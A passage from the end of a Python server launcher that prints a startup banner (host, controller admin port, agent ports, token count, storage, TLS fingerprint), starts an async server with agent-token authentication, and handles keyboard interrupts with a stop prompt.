            raise SystemExit(1) from exc

    # ── banner ────────────────────────────────────────────────────────────────
    print(art)
    print(f"  Version        {__version__}")
    print(f"  Host           {args.host}")
    print(f"  Admin port     :{args.admin_port}  (controller only)")
    print(f"  Agent ports    {', '.join(f':{p}' for p in args.ports)}")
    token_note = (
        f"{len(args.agent_tokens)} configured"
        if args.agent_tokens
        else "none — add via controller before agents connect"
    )
    print(f"  Agent tokens   {token_note}")
    print(f"  Storage        {args.storage}")
    if ssl_ctx:
        print("  TLS            enabled")
        print(f"  Cert           {cert_path}")
        print(f"  Fingerprint    {tls_fingerprint}")
    else:
        print("  TLS            disabled  (pass --tls-auto or --tls-cert/--tls-key to enable)")
    print()

    srv = Server(
        args.host,
        args.admin_port,
        args.ports,
        args.storage,
        args.admin_token,
        set(args.agent_tokens),
        ssl_ctx=ssl_ctx,
    )
    await srv.start()


def main() -> None:
    try:
        asyncio.run(amain())
    except KeyboardInterrupt:
        try:
            answer = input("\n  Stop the server? [Y/n] ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            answer = ""
        if answer not in ("n", "no"):
            print("  Server stopped.")
        else:
            print("  Cannot resume after interrupt — please restart the server.")


if __name__ == "__main__":
    main()
